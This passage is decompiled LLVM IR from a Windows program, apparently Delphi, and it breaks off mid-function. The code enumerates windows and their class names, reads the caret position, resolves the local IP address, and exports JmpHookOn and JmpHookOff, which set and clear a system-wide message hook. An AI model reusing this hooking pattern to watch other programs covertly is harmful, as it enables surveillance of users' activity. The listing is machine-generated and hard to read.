define i32 @function_406fcc(i32 %arg1) local_unnamed_addr {
dec_label_pc_406fcc:
  %ecx.1.reg2mem = alloca i32, !insn.addr !1782
  %edi.0.reg2mem = alloca i32, !insn.addr !1782
  %ecx.0.reg2mem = alloca i32, !insn.addr !1782
  %0 = call i1 @__decompiler_undefined_function_1()
  %1 = select i1 %0, i32 -1, i32 1
  store i32 -1, i32* %ecx.0.reg2mem, !insn.addr !1783
  br label %2, !insn.addr !1783

; <label>:2:                                      ; preds = %4, %dec_label_pc_406fcc
  %ecx.0.reload = load i32, i32* %ecx.0.reg2mem
  %3 = icmp eq i32 %ecx.0.reload, 0, !insn.addr !1783
  store i32 0, i32* %ecx.1.reg2mem, !insn.addr !1783
  br i1 %3, label %10, label %4, !insn.addr !1783

; <label>:4:                                      ; preds = %2
  %edi.0.reload = load i32, i32* %edi.0.reg2mem
  %5 = inttoptr i32 %edi.0.reload to i8*, !insn.addr !1783
  %6 = load i8, i8* %5, align 1, !insn.addr !1783
  %7 = icmp eq i8 %6, 0, !insn.addr !1783
  %8 = add i32 %edi.0.reload, %1, !insn.addr !1783
  %9 = add i32 %ecx.0.reload, -1, !insn.addr !1783
  store i32 %9, i32* %ecx.0.reg2mem, !insn.addr !1783
  store i32 %8, i32* %edi.0.reg2mem, !insn.addr !1783
  store i32 %9, i32* %ecx.1.reg2mem, !insn.addr !1783
  br i1 %7, label %10, label %2, !insn.addr !1783

; <label>:10:                                     ; preds = %2, %4
  %ecx.1.reload = load i32, i32* %ecx.1.reg2mem
  %11 = sub i32 -2, %ecx.1.reload, !insn.addr !1784
  ret i32 %11, !insn.addr !1785
}

declare i32 @StrPas() local_unnamed_addr

declare i32 @StrCopy() local_unnamed_addr

define i32 @function_407020() local_unnamed_addr {
dec_label_pc_407020:
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1786
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1787
  %3 = call i32 @SendMessageA(i32* %2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1787
  %4 = add i32 %3, %1, !insn.addr !1788
  %5 = inttoptr i32 %4 to i8*, !insn.addr !1788
  store i8 0, i8* %5, align 1, !insn.addr !1788
  %6 = call i32 @"@LStrFromArray"(), !insn.addr !1789
  ret i32 %6, !insn.addr !1790
}

define i32 @function_407054() local_unnamed_addr {
dec_label_pc_407054:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-284 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i8*, !insn.addr !1791
  %3 = ptrtoint i32* %stack_var_-284 to i32, !insn.addr !1792
  %4 = inttoptr i32 %1 to i32*, !insn.addr !1793
  %5 = call i32 @GetClassNameA(i32* %4, i8* %2, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1793
  %6 = add i32 %5, %3, !insn.addr !1794
  %7 = inttoptr i32 %6 to i8*, !insn.addr !1794
  store i8 0, i8* %7, align 1, !insn.addr !1794
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !1795
  ret i32 %8, !insn.addr !1796
}

define i32 @function_40708c() local_unnamed_addr {
dec_label_pc_40708c:
  %0 = call i32 @function_4034c8(), !insn.addr !1797
  %1 = call i32 @function_4034c8(), !insn.addr !1798
  %2 = call i32 @"@LStrCopy"(), !insn.addr !1799
  ret i32 %2, !insn.addr !1800
}

define i32 @function_4070cc() local_unnamed_addr {
dec_label_pc_4070cc:
  %0 = call i32 @function_4034c8(), !insn.addr !1801
  %1 = call i32 @"@LStrCopy"(), !insn.addr !1802
  ret i32 %1, !insn.addr !1803
}

define i32 @function_407104() local_unnamed_addr {
dec_label_pc_407104:
  %0 = call i32 @function_4036c8(), !insn.addr !1804
  %1 = call i32 @function_4036c8(), !insn.addr !1805
  %2 = call i32 @CompareStringA(i32 %1, i32 1, i8* inttoptr (i32 1024 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1806
  %3 = icmp eq i32 %2, 2, !insn.addr !1807
  %4 = zext i1 %3 to i32, !insn.addr !1808
  %5 = and i32 %2, -256, !insn.addr !1808
  %6 = or i32 %5, %4, !insn.addr !1808
  ret i32 %6, !insn.addr !1809
}

define i32 @function_407134() local_unnamed_addr {
dec_label_pc_407134:
  %.lcssa.reg2mem = alloca i32*, !insn.addr !1810
  %esp.0.lcssa.reg2mem = alloca i32, !insn.addr !1810
  %esp.02.reg2mem = alloca i32, !insn.addr !1810
  %storemerge3.reg2mem = alloca i32, !insn.addr !1810
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1811
  store i32 %1, i32* %stack_var_-32, align 4, !insn.addr !1811
  %2 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !1811
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1812
  %3 = ptrtoint i32* %stack_var_-36 to i32, !insn.addr !1813
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1814
  %5 = call i32* @GetTopWindow(i32* %4), !insn.addr !1814
  %storemerge1 = ptrtoint i32* %5 to i32
  %6 = add i32 %3, -4, !insn.addr !1815
  %7 = inttoptr i32 %6 to i32*, !insn.addr !1815
  store i32 %storemerge1, i32* %7, align 4, !insn.addr !1815
  %8 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1816
  %9 = icmp eq i1 %8, false, !insn.addr !1817
  %10 = icmp eq i1 %9, false, !insn.addr !1818
  store i32 %storemerge1, i32* %storemerge3.reg2mem, !insn.addr !1818
  store i32 %3, i32* %esp.02.reg2mem, !insn.addr !1818
  store i32 %3, i32* %esp.0.lcssa.reg2mem, !insn.addr !1818
  store i32* %7, i32** %.lcssa.reg2mem, !insn.addr !1818
  br i1 %10, label %dec_label_pc_407158, label %dec_label_pc_407198, !insn.addr !1818

dec_label_pc_407158:                              ; preds = %dec_label_pc_407134, %dec_label_pc_407158
  %esp.02.reload = load i32, i32* %esp.02.reg2mem
  %storemerge3.reload = load i32, i32* %storemerge3.reg2mem
  %11 = call i32 @function_407020(), !insn.addr !1819
  %12 = call i32 @function_407134(), !insn.addr !1820
  %13 = add i32 %esp.02.reload, -8, !insn.addr !1821
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1821
  store i32 2, i32* %14, align 4, !insn.addr !1821
  %15 = add i32 %esp.02.reload, -12, !insn.addr !1822
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1822
  store i32 %storemerge3.reload, i32* %16, align 4, !insn.addr !1822
  %17 = call i32* @GetWindow(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32)), !insn.addr !1823
  %storemerge = ptrtoint i32* %17 to i32
  %18 = add i32 %esp.02.reload, -16, !insn.addr !1815
  %19 = inttoptr i32 %18 to i32*
  store i32 %storemerge, i32* %19, align 4, !insn.addr !1815
  %20 = call i1 @IsWindow(i32* nonnull @0), !insn.addr !1816
  %21 = icmp eq i1 %20, false, !insn.addr !1817
  %22 = icmp eq i1 %21, false, !insn.addr !1818
  store i32 %storemerge, i32* %storemerge3.reg2mem, !insn.addr !1818
  store i32 %15, i32* %esp.02.reg2mem, !insn.addr !1818
  store i32 %15, i32* %esp.0.lcssa.reg2mem, !insn.addr !1818
  store i32* %19, i32** %.lcssa.reg2mem, !insn.addr !1818
  br i1 %22, label %dec_label_pc_407158, label %dec_label_pc_407198, !insn.addr !1818

dec_label_pc_407198:                              ; preds = %dec_label_pc_407158, %dec_label_pc_407134
  %.lcssa.reload = load i32*, i32** %.lcssa.reg2mem
  %esp.0.lcssa.reload = load i32, i32* %esp.0.lcssa.reg2mem
  %23 = load i32, i32* %.lcssa.reload, align 4, !insn.addr !1824
  call void @__writefsdword(i32 0, i32 %23), !insn.addr !1825
  %24 = add i32 %esp.0.lcssa.reload, 4, !insn.addr !1826
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1826
  store i32 4223413, i32* %25, align 4, !insn.addr !1826
  %26 = call i32 @"@LStrClr"(), !insn.addr !1827
  ret i32 %26, !insn.addr !1828
}

define i32 @function_4071ae() local_unnamed_addr {
dec_label_pc_4071ae:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1829
  ret i32 %0, !insn.addr !1829
}

define i32 @function_4071b3() local_unnamed_addr {
dec_label_pc_4071b3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1830
}

define i32 @function_4071b5(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4071b5:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1831
}

define i32 @function_4071c0() local_unnamed_addr {
dec_label_pc_4071c0:
  %stack_var_-28 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1832
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !1832
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !1832
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1833
  %2 = call i32 @function_407054(), !insn.addr !1834
  %3 = call i32 @"@LStrCmp"(), !insn.addr !1835
  %4 = call i32 @function_407134(), !insn.addr !1836
  %5 = load i32, i32* %stack_var_-28, align 4, !insn.addr !1837
  call void @__writefsdword(i32 0, i32 %5), !insn.addr !1838
  %6 = call i32 @"@LStrClr"(), !insn.addr !1839
  ret i32 %6, !insn.addr !1840
}

define i32 @function_407221() local_unnamed_addr {
dec_label_pc_407221:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1841
  ret i32 %0, !insn.addr !1841
}

define i32 @function_407226() local_unnamed_addr {
dec_label_pc_407226:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1842
}

define i32 @function_407228(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_407228:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1843
}

define i32 @function_407243() local_unnamed_addr {
dec_label_pc_407243:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %3 = add i32 %0, 1, !insn.addr !1844
  %4 = inttoptr i32 %0 to i32*, !insn.addr !1844
  store i32 %3, i32* %4, align 4, !insn.addr !1844
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1845
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1845
  %9 = add i8 %6, %8, !insn.addr !1845
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1845
  store i8 %9, i8* %10, align 1, !insn.addr !1845
  %11 = add i32 %2, 81, !insn.addr !1846
  %12 = inttoptr i32 %11 to i8*, !insn.addr !1846
  %13 = load i8, i8* %12, align 1, !insn.addr !1846
  %14 = trunc i32 %1 to i8, !insn.addr !1846
  %15 = add i8 %13, %14, !insn.addr !1846
  store i8 %15, i8* %12, align 1, !insn.addr !1846
  %16 = load i32, i32* %eax, align 4, !insn.addr !1847
  ret i32 %16, !insn.addr !1847
}

define x86_fp80 @function_40724b() local_unnamed_addr {
dec_label_pc_40724b:
  %0 = call x86_fp80 @__decompiler_undefined_function_11()
  %1 = fadd x86_fp80 %0, %0, !insn.addr !1848
  ret x86_fp80 %1, !insn.addr !1849
}

define i32 @function_407250() local_unnamed_addr {
dec_label_pc_407250:
  %esp.1.in.reg2mem = alloca i32*, !insn.addr !1850
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = call i32 @__readfsdword(i32 0), !insn.addr !1851
  store i32 %1, i32* %stack_var_-24, align 4, !insn.addr !1851
  %2 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1851
  call void @__writefsdword(i32 0, i32 %2), !insn.addr !1852
  %3 = call i32 @function_407054(), !insn.addr !1853
  %4 = call i32 @"@LStrCmp"(), !insn.addr !1854
  %5 = call i32 @GetWindowLongA(i32* inttoptr (i32 -12 to i32*), i32 %0), !insn.addr !1855
  %6 = icmp eq i32 %5, 180, !insn.addr !1856
  store i32* %stack_var_-32, i32** %esp.1.in.reg2mem, !insn.addr !1857
  br i1 %6, label %dec_label_pc_4072b3, label %dec_label_pc_40728e, !insn.addr !1857

dec_label_pc_40728e:                              ; preds = %dec_label_pc_407250
  %7 = call i32 @GetWindowLongA(i32* inttoptr (i32 -16 to i32*), i32 %0), !insn.addr !1858
  %8 = and i32 %7, 32
  %9 = icmp eq i32 %8, 0, !insn.addr !1859
  %10 = icmp eq i1 %9, false, !insn.addr !1860
  store i32* %stack_var_-40, i32** %esp.1.in.reg2mem, !insn.addr !1860
  br i1 %10, label %dec_label_pc_4072b3, label %dec_label_pc_40729a, !insn.addr !1860

dec_label_pc_40729a:                              ; preds = %dec_label_pc_40728e
  %11 = call i32 @SendMessageA(i32* null, i32 0, i32 210, i32 %0), !insn.addr !1861
  store i32* %stack_var_-56, i32** %esp.1.in.reg2mem
  br label %dec_label_pc_4072b3

dec_label_pc_4072b3:                              ; preds = %dec_label_pc_40729a, %dec_label_pc_407250, %dec_label_pc_40728e
  %esp.1.in.reload = load i32*, i32** %esp.1.in.reg2mem
  %esp.1 = ptrtoint i32* %esp.1.in.reload to i32
  %12 = load i32, i32* %esp.1.in.reload, align 4, !insn.addr !1862
  call void @__writefsdword(i32 0, i32 %12), !insn.addr !1863
  %13 = add i32 %esp.1, 8, !insn.addr !1864
  %14 = inttoptr i32 %13 to i32*, !insn.addr !1864
  store i32 4223702, i32* %14, align 4, !insn.addr !1864
  %15 = call i32 @"@LStrClr"(), !insn.addr !1865
  ret i32 %15, !insn.addr !1866
}

define i32 @function_4072cf() local_unnamed_addr {
dec_label_pc_4072cf:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1867
  ret i32 %0, !insn.addr !1867
}

define i32 @function_4072d4() local_unnamed_addr {
dec_label_pc_4072d4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1868
}

define i32 @function_4072d6(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4072d6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1869
}

define i32 @function_4072ec() local_unnamed_addr {
dec_label_pc_4072ec:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1870
  %3 = call i32* @GetDC(i32* %2), !insn.addr !1870
  %4 = ptrtoint i32* %3 to i32, !insn.addr !1870
  %5 = call i32 @SendMessageA(i32* null, i32 0, i32 49, i32 %1), !insn.addr !1871
  %6 = inttoptr i32 %5 to i32*, !insn.addr !1872
  %7 = call i32* @SelectObject(i32* %6, i32* %3), !insn.addr !1872
  %8 = call i1 @GetCharWidthA(i32* nonnull %stack_var_-40, i32 42, i32 42, i32* %3), !insn.addr !1873
  %9 = call i32* @GetStockObject(i32 10), !insn.addr !1874
  %10 = call i32* @SelectObject(i32* %9, i32* %3), !insn.addr !1875
  %11 = inttoptr i32 %1 to i32*, !insn.addr !1876
  %12 = call i32 @ReleaseDC(i32* %3, i32* %11), !insn.addr !1876
  %13 = bitcast i32* %stack_var_-84 to %tagPOINT*
  %14 = call i1 @GetCaretPos(%tagPOINT* nonnull %13), !insn.addr !1877
  %15 = ptrtoint i32* %stack_var_-84 to i32, !insn.addr !1878
  %16 = ashr i32 %15, 31, !insn.addr !1879
  %17 = zext i32 %15 to i64, !insn.addr !1880
  %18 = zext i32 %16 to i64, !insn.addr !1880
  %19 = mul i64 %18, 4294967296, !insn.addr !1880
  %20 = or i64 %19, %17, !insn.addr !1880
  %21 = zext i32 %4 to i64, !insn.addr !1880
  %22 = sdiv i64 %20, %21, !insn.addr !1880
  %23 = trunc i64 %22 to i32, !insn.addr !1880
  ret i32 %23, !insn.addr !1881
}

define i32 @function_407348() local_unnamed_addr {
dec_label_pc_407348:
  %esp.0.reg2mem = alloca i32, !insn.addr !1882
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1883
  store i32 %0, i32* %stack_var_-28, align 4, !insn.addr !1883
  %1 = ptrtoint i32* %stack_var_-28 to i32, !insn.addr !1883
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1884
  %2 = load i32, i32* @global_var_409154, align 4, !insn.addr !1885
  %3 = icmp eq i32 %2, 0, !insn.addr !1885
  br i1 %3, label %dec_label_pc_407384, label %dec_label_pc_407371, !insn.addr !1886

dec_label_pc_407371:                              ; preds = %dec_label_pc_407348
  %4 = inttoptr i32 %2 to i32*, !insn.addr !1887
  store i32 0, i32* %4, align 4, !insn.addr !1887
  br label %dec_label_pc_407384, !insn.addr !1888

dec_label_pc_407384:                              ; preds = %dec_label_pc_407371, %dec_label_pc_407348
  %5 = load i32, i32* @global_var_40913c, align 4, !insn.addr !1889
  %6 = icmp eq i32 %5, 0, !insn.addr !1889
  br i1 %6, label %dec_label_pc_407398, label %dec_label_pc_40738e, !insn.addr !1890

dec_label_pc_40738e:                              ; preds = %dec_label_pc_407384
  %7 = load i32, i32* @global_var_409140, align 4, !insn.addr !1891
  %8 = icmp eq i32 %7, 0, !insn.addr !1891
  %9 = icmp eq i1 %8, false, !insn.addr !1892
  br i1 %9, label %dec_label_pc_4073a2, label %dec_label_pc_407398, !insn.addr !1892

dec_label_pc_407398:                              ; preds = %dec_label_pc_40738e, %dec_label_pc_407384
  %10 = call i32 @function_40747c(), !insn.addr !1893
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1894
  br label %dec_label_pc_40743f, !insn.addr !1894

dec_label_pc_4073a2:                              ; preds = %dec_label_pc_40738e
  %11 = load i8, i8* bitcast (i32** @global_var_409160 to i8*), align 4, !insn.addr !1895
  %12 = icmp eq i8 %11, 0, !insn.addr !1895
  br i1 %12, label %dec_label_pc_4073cb, label %dec_label_pc_4073ac, !insn.addr !1896

dec_label_pc_4073ac:                              ; preds = %dec_label_pc_4073a2
  %13 = call i32 @function_406c64(), !insn.addr !1897
  %14 = icmp eq i32 %13, 0, !insn.addr !1898
  br i1 %14, label %dec_label_pc_4073cb, label %dec_label_pc_4073c4, !insn.addr !1899

dec_label_pc_4073c4:                              ; preds = %dec_label_pc_4073ac
  %15 = call i32 @function_40747c(), !insn.addr !1900
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1901
  br label %dec_label_pc_40743f, !insn.addr !1901

dec_label_pc_4073cb:                              ; preds = %dec_label_pc_4073ac, %dec_label_pc_4073a2
  %16 = call i32 @"@LStrCatN"(), !insn.addr !1902
  %17 = call i32 @"@LStrAsg"(), !insn.addr !1903
  %18 = bitcast i32* %stack_var_-12 to %_SECURITY_ATTRIBUTES*
  %19 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 2 to i32 (i32*)*), i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !1904
  %20 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* inttoptr (i32 1 to i32 (i32*)*), i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !1905
  store i32 0, i32* %stack_var_-112, align 4, !insn.addr !1906
  %21 = ptrtoint i32* %stack_var_-112 to i32, !insn.addr !1906
  %22 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %18, i32 0, i32 (i32*)* null, i32* inttoptr (i32 4219720 to i32*), i32 0, i32* null), !insn.addr !1907
  %23 = call i32 @function_40747c(), !insn.addr !1908
  store i32 %21, i32* %esp.0.reg2mem, !insn.addr !1908
  br label %dec_label_pc_40743f, !insn.addr !1908

dec_label_pc_40743f:                              ; preds = %dec_label_pc_4073cb, %dec_label_pc_4073c4, %dec_label_pc_407398
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %24 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1909
  %25 = load i32, i32* %24, align 4, !insn.addr !1909
  call void @__writefsdword(i32 0, i32 %25), !insn.addr !1910
  %26 = add i32 %esp.0.reload, 8, !insn.addr !1911
  %27 = inttoptr i32 %26 to i32*, !insn.addr !1911
  store i32 4224092, i32* %27, align 4, !insn.addr !1911
  %28 = call i32 @"@LStrClr"(), !insn.addr !1912
  ret i32 %28, !insn.addr !1913
}

define i32 @function_407455() local_unnamed_addr {
dec_label_pc_407455:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1914
  ret i32 %0, !insn.addr !1914
}

define i32 @function_40745a() local_unnamed_addr {
dec_label_pc_40745a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1915
}

define i32 @function_40745c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_40745c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1916
}

define i32 @function_40747c() local_unnamed_addr {
dec_label_pc_40747c:
  %0 = call i32 @"@LStrClr"(), !insn.addr !1917
  %1 = call i32 @"@LStrClr"(), !insn.addr !1918
  ret i32 %1, !insn.addr !1919
}

define i32 @function_407494() local_unnamed_addr {
dec_label_pc_407494:
  %eax.0.reg2mem = alloca i32, !insn.addr !1920
  %esp.0.reg2mem = alloca i32, !insn.addr !1920
  %esp.15.reg2mem = alloca i32, !insn.addr !1920
  %storemerge6.reg2mem = alloca i32, !insn.addr !1920
  %.reg2mem = alloca i32, !insn.addr !1920
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-500 = alloca i8*, align 4
  %stack_var_-496 = alloca i32, align 4
  %stack_var_-488 = alloca i32, align 4
  %2 = trunc i32 %1 to i16, !insn.addr !1920
  %3 = inttoptr i32 %0 to %WSAData*, !insn.addr !1921
  store i32 257, i32* %stack_var_-488, align 4, !insn.addr !1922
  %4 = call i32 @WSAStartup(i16 %2, %WSAData* %3), !insn.addr !1923
  %5 = call i32 @"@LStrClr"(), !insn.addr !1924
  %6 = ptrtoint i32* %stack_var_-488 to i32, !insn.addr !1925
  store i32 %6, i32* %stack_var_-496, align 4, !insn.addr !1925
  %7 = call i32 @gethostname(i8* inttoptr (i32 64 to i8*), i32 %6), !insn.addr !1926
  %8 = bitcast i32* %stack_var_-496 to i8*
  store i8* %8, i8** %stack_var_-500, align 4, !insn.addr !1927
  %9 = call %hostent* @gethostbyname(i8* nonnull %8), !insn.addr !1928
  %10 = ptrtoint %hostent* %9 to i32, !insn.addr !1928
  %11 = icmp eq %hostent* %9, null, !insn.addr !1929
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !1930
  br i1 %11, label %dec_label_pc_4074f2, label %dec_label_pc_4074cc, !insn.addr !1930

dec_label_pc_4074cc:                              ; preds = %dec_label_pc_407494
  %12 = add i32 %10, 12, !insn.addr !1931
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1931
  %14 = load i32, i32* %13, align 4, !insn.addr !1931
  %15 = inttoptr i32 %14 to i32*, !insn.addr !1932
  %16 = load i32, i32* %15, align 4, !insn.addr !1932
  %17 = icmp eq i32 %16, 0, !insn.addr !1933
  %18 = icmp eq i1 %17, false, !insn.addr !1934
  br i1 %18, label %dec_label_pc_4074d3.lr.ph, label %dec_label_pc_4074ed, !insn.addr !1934

dec_label_pc_4074d3.lr.ph:                        ; preds = %dec_label_pc_4074cc
  %19 = ptrtoint i8** %stack_var_-500 to i32, !insn.addr !1927
  store i32 %16, i32* %.reg2mem
  store i32 0, i32* %storemerge6.reg2mem
  store i32 %19, i32* %esp.15.reg2mem
  br label %dec_label_pc_4074d3

dec_label_pc_4074d3:                              ; preds = %dec_label_pc_4074d3.lr.ph, %dec_label_pc_4074e5
  %esp.15.reload = load i32, i32* %esp.15.reg2mem
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %20 = icmp eq i32 %storemerge6.reload, 0, !insn.addr !1935
  %21 = icmp eq i1 %20, false, !insn.addr !1936
  store i32 %esp.15.reload, i32* %esp.0.reg2mem, !insn.addr !1936
  br i1 %21, label %dec_label_pc_4074e5, label %dec_label_pc_4074d7, !insn.addr !1936

dec_label_pc_4074d7:                              ; preds = %dec_label_pc_4074d3
  %.reload = load i32, i32* %.reg2mem
  %22 = inttoptr i32 %.reload to i32*, !insn.addr !1937
  %23 = load i32, i32* %22, align 4, !insn.addr !1937
  %24 = add i32 %esp.15.reload, -4, !insn.addr !1937
  %25 = inttoptr i32 %24 to i32*, !insn.addr !1937
  store i32 %23, i32* %25, align 4, !insn.addr !1937
  %26 = call i8* @inet_ntoa(%in_addr { i32 ptrtoint (i32* @0 to i32) }), !insn.addr !1938
  %27 = call i32 @StrPas(), !insn.addr !1939
  store i32 %24, i32* %esp.0.reg2mem, !insn.addr !1939
  br label %dec_label_pc_4074e5, !insn.addr !1939

dec_label_pc_4074e5:                              ; preds = %dec_label_pc_4074d7, %dec_label_pc_4074d3
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = add i32 %storemerge6.reload, 1, !insn.addr !1940
  %29 = mul i32 %28, 4, !insn.addr !1932
  %30 = add i32 %29, %14, !insn.addr !1932
  %31 = inttoptr i32 %30 to i32*, !insn.addr !1932
  %32 = load i32, i32* %31, align 4, !insn.addr !1932
  %33 = icmp eq i32 %32, 0, !insn.addr !1933
  %34 = icmp eq i1 %33, false, !insn.addr !1934
  store i32 %32, i32* %.reg2mem, !insn.addr !1934
  store i32 %28, i32* %storemerge6.reg2mem, !insn.addr !1934
  store i32 %esp.0.reload, i32* %esp.15.reg2mem, !insn.addr !1934
  br i1 %34, label %dec_label_pc_4074d3, label %dec_label_pc_4074ed, !insn.addr !1934

dec_label_pc_4074ed:                              ; preds = %dec_label_pc_4074e5, %dec_label_pc_4074cc
  %35 = call i32 @WSACleanup(), !insn.addr !1941
  store i32 %35, i32* %eax.0.reg2mem, !insn.addr !1941
  br label %dec_label_pc_4074f2, !insn.addr !1941

dec_label_pc_4074f2:                              ; preds = %dec_label_pc_4074ed, %dec_label_pc_407494
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !1942
}

define i32 @function_407500() local_unnamed_addr {
dec_label_pc_407500:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1943
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1943
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1943
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1944
  %2 = load i32, i32* @global_var_40a6e0, align 4, !insn.addr !1945
  %3 = add i32 %2, 1, !insn.addr !1945
  store i32 %3, i32* @global_var_40a6e0, align 4, !insn.addr !1945
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1946
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1947
  ret i32 0, !insn.addr !1948
}

define i32 @function_407525() local_unnamed_addr {
dec_label_pc_407525:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1949
  ret i32 %0, !insn.addr !1949
}

define i32 @function_40752a() local_unnamed_addr {
dec_label_pc_40752a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1950
}

define i32 @function_40752c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40752c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1951
}

define i32 @function_407530() local_unnamed_addr {
dec_label_pc_407530:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40a6e0, align 4, !insn.addr !1952
  %2 = add i32 %1, -1, !insn.addr !1952
  store i32 %2, i32* @global_var_40a6e0, align 4, !insn.addr !1952
  ret i32 %0, !insn.addr !1953
}

define i32 @function_407538(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_407538:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = inttoptr i32 %0 to i32*, !insn.addr !1954
  %2 = call i32 @CallNextHookEx(i32* %1, i32 %arg1, i32 %arg2, i32 %arg3), !insn.addr !1954
  ret i32 %2, !insn.addr !1955
}

define i32 @JmpHookOn() local_unnamed_addr {
dec_label_pc_407558:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_40a650, align 4
  %1 = call i32* @SetWindowsHookExA(i32 0, i32 (i32, i32, i32)* %0, i32* inttoptr (i32 4224312 to i32*), i32 3), !insn.addr !1956
  %2 = ptrtoint i32* %1 to i32, !insn.addr !1956
  store i32 %2, i32* @global_var_40a6e8, align 4, !insn.addr !1957
  %3 = icmp eq i32* %1, null, !insn.addr !1958
  %4 = icmp eq i1 %3, false, !insn.addr !1959
  %5 = sext i1 %4 to i32, !insn.addr !1960
  ret i32 %5, !insn.addr !1961
}

define i32 @JmpHookOff() local_unnamed_addr {
dec_label_pc_407584:
  %0 = load i32, i32* @global_var_40a6e8, align 4, !insn.addr !1962
  %1 = inttoptr i32 %0 to i32*, !insn.addr !1963
